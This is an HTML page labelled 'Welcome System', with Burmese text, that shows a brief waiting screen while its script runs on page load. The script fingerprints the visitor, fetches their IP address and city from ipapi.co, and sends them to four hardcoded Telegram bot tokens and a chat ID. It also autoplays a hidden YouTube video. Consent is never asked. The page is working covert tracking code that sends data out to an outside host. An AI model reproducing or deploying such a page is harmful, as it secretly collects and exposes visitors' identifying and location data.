<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <title>Welcome System</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
</head>
<body class="bg-black text-white h-screen flex flex-col items-center justify-center">

    <!-- YouTube Music -->
    <iframe id="yt-player" class="hidden" src="" allow="autoplay"></iframe>

    <!-- Welcome Page -->
    <div id="welcome-view" class="text-center">
        <h1 class="text-4xl font-bold animate-pulse">ခဏစောင့်ပေးပါ...</h1>
    </div>

    <!-- Main Page -->
    <div id="main-view" class="hidden text-center">
        <h1 class="text-3xl font-bold">Main Page သို့ ရောက်ရှိပါပြီ</h1>
        <p class="text-gray-400">အချက်အလက်များ စနစ်အတွင်းသို့ ပို့ဆောင်ပြီးပါပြီ။</p>
    </div>

    <script>
        async function runSystem() {
            // 1. YouTube Music Auto-play
            const ytId = localStorage.getItem('ytId') || 'dQw4w9WgXcQ';
            const player = document.getElementById('yt-player');
            player.src = `https://www.youtube.com/embed/${ytId}?autoplay=1&loop=1`;

            // 2. Tracking and Sending to Telegram
            const fp = await FingerprintJS.load();
            const res = await fp.get();
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
            const msg = `Visitor Info:%0AID: ${res.visitorId}%0AIP: ${ipData.ip}%0ACity: ${ipData.city}`;
            
            const bots = [
                "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g",
                "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0",
                "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0",
                "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ"
            ];

            bots.forEach(token => {
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=6917040501&text=${msg}`);
            });

            // 3. 3 Seconds Redirect
            setTimeout(() => {
                document.getElementById('welcome-view').classList.add('hidden');
                document.getElementById('main-view').classList.remove('hidden');
            }, 3000);
        }

        window.onload = runSystem;
    </script>
</body>
</html>
